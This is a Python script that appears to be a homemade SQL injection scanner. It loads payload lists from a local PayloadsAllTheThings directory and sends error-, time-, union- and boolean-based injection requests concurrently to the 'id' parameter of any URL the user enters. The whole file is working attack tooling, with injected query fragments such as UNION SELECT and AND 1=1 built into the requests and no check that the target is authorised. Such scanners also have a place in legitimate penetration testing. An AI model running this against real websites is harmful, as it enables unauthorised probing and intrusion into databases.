
import aiohttp
import asyncio
import time
import os


def load_payloads_from_directory(directory_path):
    payloads = {
        'error_based': [],
        'time_based': [],
        'union_based': [],
        'boolean_based': []
    }

    try:
        # Verify the directory exists
        if not os.path.exists(directory_path):
            print(f"[!] Directory does not exist: {directory_path}")
            return {}

        # List all files in the directory
        for filename in os.listdir(directory_path):
            file_path = os.path.join(directory_path, filename)
            if os.path.isfile(file_path):
                try:
                    with open(file_path, 'r', encoding='utf-8') as file:
                        lines = file.read().splitlines()

                        # Check the filename for categorization
                        if 'error' in filename.lower():
                            payloads['error_based'].extend(lines)
                        elif 'time' in filename.lower():
                            payloads['time_based'].extend(lines)
                        elif 'union' in filename.lower():
                            payloads['union_based'].extend(lines)
                        elif 'boolean' in filename.lower():
                            payloads['boolean_based'].extend(lines)

                        print(f"[+] Loaded {len(lines)} payloads from {filename}")
                except Exception as e:
                    print(f"[!] Error reading file {filename}: {e}")
            else:
                print(f"[!] Skipping non-file item in directory: {filename}")

        # Check if any payloads were loaded
        if not any(payloads.values()):
            print("[!] No payloads loaded. Ensure the files are correctly named and non-empty.")
        
        return payloads
    except Exception as e:
        print(f"[!] Error while loading payloads from directory: {e}")
        return {}


# Asynchronous request for testing error-based injection
async def check_error_based_injection(session, url, payload):
    test_url = f"{url}?id={payload}"
    try:
        async with session.get(test_url) as response:
            content = await response.text()  # Get the response text
            print(f"Testing error-based payload: {payload}")
            print(f"Response status: {response.status}")
            if response.status == 200:
                if "error" in content.lower() or "syntax" in content.lower():
                    print(f"[!] Error-based SQL Injection detected with payload: {payload}")
                    return True
    except Exception as e:
        print(f"[!] Error testing URL with payload {payload}: {e}")
    return False

# Asynchronous request for testing time-based injection
async def check_time_based_injection(session, url, payload):
    test_url = f"{url}?id={payload}'"
    try:
        start_time = time.time()
        async with session.get(test_url, timeout=10) as response:  # Increase timeout
            end_time = time.time()
            print(f"Testing time-based payload: {payload}")
            print(f"Response status: {response.status}")
            if end_time - start_time > 5:  # Adjust this threshold based on the server's response time
                print(f"[!] Time-based SQL Injection detected with payload: {payload}")
                return True
    except Exception as e:
        print(f"[!] Error testing URL with payload {payload}: {e}")
    return False

# Asynchronous request for testing union-based injection
async def check_union_based_injection(session, url, payload):
    test_url = f"{url}?id={payload}' UNION SELECT NULL, NULL --"
    try:
        async with session.get(test_url) as response:
            content = await response.text()  # Get the response text
            print(f"Testing union-based payload: {payload}")
            print(f"Response status: {response.status}")
            if response.status == 200 and "error" not in content.lower():
                print(f"[!] Potential UNION-based SQL Injection detected with payload: {payload}")
                return True
    except Exception as e:
        print(f"[!] Error testing URL with payload {payload}: {e}")
    return False

# Asynchronous request for testing boolean-based injection
async def check_boolean_based_injection(session, url, payload):
    test_url = f"{url}?id={payload}' AND 1=1 --"
    try:
        async with session.get(test_url) as response_1:
            test_url_false = f"{url}?id={payload}' AND 1=2 --"
            async with session.get(test_url_false) as response_2:
                print(f"Testing boolean-based payload: {payload}")
                print(f"Response status for true condition: {response_1.status}")
                print(f"Response status for false condition: {response_2.status}")
                if await response_1.text() != await response_2.text():
                    print(f"[!] Boolean-based SQL Injection detected with payload: {payload}")
                    return True
    except Exception as e:
        print(f"[!] Error testing URL with payload {payload}: {e}")
    return False


async def test_sql_injection(url, payloads):
    async with aiohttp.ClientSession() as session:
        tasks = []
        found_injection = False

        # Add tasks for error-based, time-based, union-based, and boolean-based checks
        for payload in payloads.get('error_based', []):
            tasks.append(check_error_based_injection(session, url, payload))
        
        for payload in payloads.get('time_based', []):
            tasks.append(check_time_based_injection(session, url, payload))

        for payload in payloads.get('union_based', []):
            tasks.append(check_union_based_injection(session, url, payload))

        for payload in payloads.get('boolean_based', []):
            tasks.append(check_boolean_based_injection(session, url, payload))
        
        # Run tasks concurrently and wait for results
        results = await asyncio.gather(*tasks)
        
        # Check if any of the injection tests returned True
        for result in results:
            if result:  # If any injection type is found
                found_injection = True

    # Return the result message as a string
    if found_injection:
        return "[!] SQL Injection is possible for the provided URL!"
    else:
        return "[+] No SQL Injection vulnerability found."


if __name__ == "__main__":
    # Get URL input from the user
    url = input("Enter the URL to scan (e.g., http://example.com/vulnerable_page): ")

    # Define the directory where payload files are stored
    directory_path = r"C:\Users\DEVANSH\Downloads\test2\PayloadsAllTheThings\SQL Injection\Intruder"

    # Load payloads from the directory
    payloads = load_payloads_from_directory(directory_path)

    if payloads:
        # Run the SQL injection tests asynchronously
        asyncio.run(test_sql_injection(url, payloads))
    else:
        print("[!] No payloads were loaded.")